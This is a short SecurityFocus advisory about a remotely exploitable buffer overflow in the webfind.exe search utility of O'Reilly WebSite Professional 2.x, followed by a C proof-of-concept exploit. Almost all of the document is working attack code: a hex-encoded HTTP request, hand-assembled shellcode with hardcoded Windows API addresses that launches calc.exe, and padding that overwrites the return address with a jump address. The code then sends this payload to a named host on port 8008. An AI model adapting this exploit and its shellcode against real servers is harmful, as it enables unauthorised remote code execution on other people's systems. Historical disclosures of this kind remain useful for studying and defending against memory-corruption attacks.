source: http://www.securityfocus.com/bid/1487/info

O'Reilly WebSite Professional is a web server package distributed by O'Reilly & Associates. Certain versions of this web server (the entire 2.X version line) ship with a utility containing a remotely exploitable buffer overflow. The utility in question is a search engine utility titled 'webfind.exe'. This program takes unchecked user input from a provided search page which can result in a remote user launching arbitrary commands on the server itself. The variable in question which is overwritten is QUERY_STRING derived from user 'keywords' for their search.

/***************************************************************************
****/
/*   Buffer overrun in WebSite Pro's webfind.exe
*/
/*
*/
/*
*/
/*   This is "proof of concept" code which will launch a window of calc.exe
on */
/*   the server's machine. This code will _not_ work as is. When the search
*/
/*   request is made two packets are sent by the client computer. The first
*/
/*   should be sniffed and copied and pasted straight into buffer 1. Then
for  */
/*   second packet sniff again, and copy the end of the data packet from
*/
/*   "&indexname" onwards (This will vary from server to server)
*/
/*
*/
/*   Robert Horton ( hyphen@devilnet-uk.net )
*/
/*
*/
/*   June 2000
*/
/*
*/
/*   usage: program.exe <hostname>
*/
/***************************************************************************
****/



#include <windows.h>
#include <winsock.h>
#include <string.h>
#include <stdio.h>



struct sockaddr_in sa;
struct hostent *he;
SOCKET sock;



char *buffer1 ="\x050\x04F\x053\x054\x020\x02F\x063\x067\x069\x02D\x0\
73\x068\x06C\x02F\x077\x065\x062\x066\x069\x06E\x064\x02E\x065\x078\x065\x02
0\x0\
48\x054\x054\x050\x02F\x031\x02E\x031\x00D\x00A\x041\x063\x063\x065\x070\x07
4\x0\
3A\x020\x069\x06D\x061\x067\x065\x02F\x067\x069\x066\x02C\x020\x069\x06D\x06
1\x0\
67\x065\x02F\x078\x02D\x078\x062\x069\x074\x06D\x061\x070\x02C\x020\x069\x06
D\x0\
61\x067\x065\x02F\x06A\x070\x065\x067\x02C\x020\x069\x06D\x061\x067\x065\x02
F\x0\
70\x06A\x070\x065\x067\x02C\x020\x061\x070\x070\x06C\x069\x063\x061\x074\x06
9\x0\
6F\x06E\x02F\x076\x06E\x064\x02E\x06D\x073\x02D\x070\x06F\x077\x065\x072\x07
0\x0\
6F\x069\x06E\x074\x02C\x020\x061\x070\x070\x06C\x069\x063\x061\x074\x069\x06
F\x0\
6E\x02F\x076\x06E\x064\x02E\x06D\x073\x02D\x065\x078\x063\x065\x06C\x02C\x02
0\x0\
61\x070\x070\x06C\x069\x063\x061\x074\x069\x06F\x06E\x02F\x06D\x073\x077\x06
F\x0\
72\x064\x02C\x020\x02A\x02F\x02A\x00D\x00A\x052\x065\x066\x065\x072\x065\x07
2\x0\
3A\x020\x068\x074\x074\x070\x03A\x02F\x02F\x031\x030\x02E\x032\x02E\x032\x02
E\x0\
38\x032\x03A\x038\x030\x030\x038\x02F\x063\x067\x069\x02D\x073\x068\x06C\x02
F\x0\
77\x065\x062\x066\x069\x06E\x064\x02E\x065\x078\x065\x00D\x00A\x041\x063\x06
3\x0\
65\x070\x074\x02D\x04C\x061\x06E\x067\x075\x061\x067\x065\x03A\x020\x065\x06
E\x0\
2D\x067\x062\x00D\x00A\x043\x06F\x06E\x074\x065\x06E\x074\x02D\x054\x079\x07
0\x0\
65\x03A\x020\x061\x070\x070\x06C\x069\x063\x061\x074\x069\x06F\x06E\x02F\x07
8\x0\
2D\x077\x077\x077\x02D\x066\x06F\x072\x06D\x02D\x075\x072\x06C\x065\x06E\x06
3\x0\
6F\x064\x065\x064\x00D\x00A\x041\x063\x063\x065\x070\x074\x02D\x045\x06E\x06
3\x0\
6F\x064\x069\x06E\x067\x03A\x020\x067\x07A\x069\x070\x02C\x020\x064\x065\x06
6\x0\
6C\x061\x074\x065\x00D\x00A\x055\x073\x065\x072\x02D\x041\x067\x065\x06E\x07
4\x0\
3A\x020\x04D\x06F\x07A\x069\x06C\x06C\x061\x02F\x034\x02E\x030\x020\x028\x06
3\x0\
6F\x06D\x070\x061\x074\x069\x062\x06C\x065\x03B\x020\x04D\x053\x049\x045\x02
0\x0\
35\x02E\x030\x031\x03B\x020\x057\x069\x06E\x064\x06F\x077\x073\x020\x04E\x05
4\x0\
20\x035\x02E\x030\x03B\x020\x044\x069\x067\x045\x078\x074\x029\x00D\x00A\x04
8\x0\
6F\x073\x074\x03A\x020\x031\x030\x02E\x032\x02E\x032\x02E\x038\x032\x03A\x03
8\x0\
30\x030\x038\x00D\x00A\x043\x06F\x06E\x074\x065\x06E\x074\x02D\x04C\x065\x06
E\x0\
67\x074\x068\x03A\x020\x031\x031\x032\x031\x00D\x00A\x043\x06F\x06E\x06E\x06
5\x0\
63\x074\x069\x06F\x06E\x03A\x020\x04B\x065\x065\x070\x02D\x041\x06C\x069\x07
6\x0\
65\x00D\x00A\x00D\x00A";


char buffer2[2000];

char *end_variables =
"\x026\x069\x06E\x064\x065\x078\x06E\x061\x06D\x065\x03D\x0\
69\x06E\x064\x065\x078\x031\x026\x06D\x061\x078\x068\x069\x074\x073\x03D\x04
1\x0\
6C\x06C\x026\x073\x065\x061\x072\x063\x068\x069\x06E\x03D\x043\x06F\x06D\x07
0\x0\
6C\x065\x074\x065\x02B\x046\x069\x06C\x065";


unsigned int addr;

char hostname[256];

int startWSOCK(char *swhost)
{
 int err=0;
 WORD wVersionRequested;
 WSADATA wsaData;



 wVersionRequested = MAKEWORD( 2, 0 );
 err = WSAStartup( wVersionRequested, &wsaData );
 if ( err != 0 )
  {

   return 0;
  }
 if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 0 )
  {
       WSACleanup( );
      return 0;
  }

  if (isalpha(swhost[0]))
  {
   he = gethostbyname(swhost);
  }
  else
  {
   addr = inet_addr(swhost);
   he = gethostbyaddr((char *)&addr,4,AF_INET);
  }

 if (he == NULL)
  {
   return 0;
  }

 sa.sin_addr.s_addr=INADDR_ANY;
 sa.sin_family=AF_INET;
 memcpy(&sa.sin_addr,he->h_addr,he->h_length);
 return 1;
}



int sendString()
{
 int snd, rcv, err, count =0, wui=0, in=0, num=0, b=0,inter =0;
 char resp[20000];
 char logoff[80];


 /*Construct second buffer to send
   First add "keywords=" */


 _snprintf(buffer2, 9,"\x06B\x065\x079\x077\x06F\x072\x064\x073\x03D");

 /* Add exploit code*/
 count = 9;

 buffer2[count] = 0x90;  /*nop*/
 count++;

 buffer2[count] = 0x55;  /*push ebp*/
 count++;

 buffer2[count] = 0x8b; /*mov ebp, esp*/
 count++;
 buffer2[count] = 0xec;
 count++;

 buffer2[count] = 0x33;  /*xor esi, esi*/
 count++;
 buffer2[count] = 0xf6;
 count++;

 buffer2[count] = 0x56;  /*push esi*/
 count++;

 buffer2[count] = 0xb8;  /*mov eax, 0x77f1a986*/
 count++;
 buffer2[count] = 0x86;
 count++;
 buffer2[count] = 0xa9;
 count++;
 buffer2[count] = 0xf1;
 count++;
 buffer2[count] = 0x77;
 count++;

 buffer2[count] = 0x68;  /*push ".exe"*/
 count++;
 buffer2[count] = 0x2e;
 count++;
 buffer2[count] = 0x65;
 count++;
 buffer2[count] = 0x78;
 count++;
 buffer2[count] = 0x65;
 count++;

 buffer2[count] = 0x68;  /*push "calc"*/
 count++;
 buffer2[count] = 0x63;
 count++;
 buffer2[count] = 0x61;
 count++;
 buffer2[count] = 0x6c;
 count++;
 buffer2[count] = 0x63;
 count++;

 buffer2[count] = 0x8b;  /*mov ebx, esp*/
 count++;
 buffer2[count] = 0xdc;
 count++;

 buffer2[count] = 0xbe;  /*mov esi, ffffffff*/
 count++;
 buffer2[count] = 0xff;
 count++;
 buffer2[count] = 0xff;
 count++;
 buffer2[count] = 0xff;
 count++;
 buffer2[count] = 0xff;
 count++;

 buffer2[count] = 0x83;  /*sub esi, f5ffffff*/
 count++;
 buffer2[count] = 0xee;
 count++;
 buffer2[count] = 0xf5;
 count++;


 buffer2[count] = 0x56;  /*push esi*/
 count++;

 buffer2[count] = 0x53;  /*push ebx*/
 count++;

 buffer2[count] = 0xff;  /*call eax*/
 count++;
 buffer2[count] = 0xd0;
 count++;

 buffer2[count] = 0x33;  /*xor eax, eax*/
 count++;
 buffer2[count] = 0xc0;
 count++;

 buffer2[count] = 0x50;  /*push eax*/
 count++;

 buffer2[count] = 0xb8;  /*mov eax, 0x77f19f92*/
 count++;
 buffer2[count] = 0x92;
 count++;
 buffer2[count] = 0x9f;
 count++;
 buffer2[count] = 0xf1;
 count++;
 buffer2[count] = 0x77;
 count++;


 buffer2[count] = 0xff; /*call eax*/
 count++;
 buffer2[count] = 0xd0; /*should exit*/
 count++;



 buffer2[count] = 0xcc;  /*breakpoint*/
 count++;


 /*add some filler characters*/


 while(count < 1009)
 {
  buffer2[count] = 0x41;
  count++;
 }

 /*address in memory of "jump ebp"*/

 buffer2[count] = 0xdb;
 count ++;
 buffer2[count] = 0xcf;
 count ++;
 buffer2[count] = 0xf3;
 count ++;
 buffer2[count] = 0x77;
 count ++;

 /*more fillers*/

 while(count < 1080)
 {
  buffer2[count] = 0x41;
  count ++;
 }

 /*finally add final variables to string
   these will vary depending on the server
   and index searched (i.e. copy and paste
   from a sniffer
 */

 _snprintf(buffer2 + 1080, 2000, end_variables);


    /*connect and send*/

 sa.sin_port=htons(8008);
 sock=socket(AF_INET,SOCK_STREAM,0);
 bind(sock,(struct sockaddr *)&sa,sizeof(sa));


 if (sock==INVALID_SOCKET)
  {

   printf ("invalid socket\n");
   closesocket(sock);
   return 0;
  }


 if(connect(sock,(struct sockaddr *)&sa,sizeof(sa)) < 0)
  {
      printf("Couldn't connect");
   closesocket(sock);
   return 0;
  }
 else
  {


   snd=send(sock, buffer1,strlen(buffer1),0);
   snd=send(sock, buffer2,strlen(buffer2),0);

   rcv = recv(sock,resp,2001,0);

   closesocket(sock);
  }




return 0;
}




int main(int argc, char *argv[])
{
 int chk=0,count =0;


 if(argc !=2)
  return 0;

 strncpy(hostname, argv[1], 256 );





 if(startWSOCK(hostname))
 {
   sendString();
 }

 return 0;

}






